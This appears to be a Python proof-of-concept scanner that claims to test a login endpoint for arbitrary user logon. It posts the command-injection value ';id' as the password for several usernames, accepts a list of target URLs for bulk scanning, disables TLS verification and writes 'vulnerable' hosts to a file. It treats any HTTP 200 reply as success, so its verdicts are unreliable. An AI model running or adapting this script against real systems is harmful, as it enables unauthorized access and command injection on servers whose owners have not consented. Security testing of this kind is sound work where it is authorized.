# -*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()

def banner():
    test = """

                                                _             _       
                                               | |           (_)      
      _____   _____ _ __ _   _  ___  _ __   ___| | ___   __ _ _ _ __  
     / _ \ \ / / _ \ '__| | | |/ _ \| '_ \ / _ \ |/ _ \ / _` | | '_ \ 
    |  __/\ V /  __/ |  | |_| | (_) | | | |  __/ | (_) | (_| | | | | |
     \___| \_/ \___|_|   \__, |\___/|_| |_|\___|_|\___/ \__, |_|_| |_|
                          __/ |                          __/ |        
                         |___/                          |___/         
    tag:This is an arbitrary user logon script test POC
    @author: zxy
    @version: 1.0.0          
     """
    print(test)

def custom_login_poc(target):
    url = target + "/api/v1/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    usernames = ["user1", "user2", "user3"]
    for username in usernames:
        json = {
            "username": username,
            "password": ";id"
        }
        try:
            response = requests.post(url, headers=headers, json=json, verify=False, timeout=5)
            if response.status_code == 200:  # 检查状态码是否为 200 OK
                print(f"[+] {target} is vulnerable, [Custom Login POC Successful]")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} is not vulnerable")
        except:
            print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='Custom Login POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help="Example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        custom_login_poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        for j in url_list:
            custom_login_poc(j)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
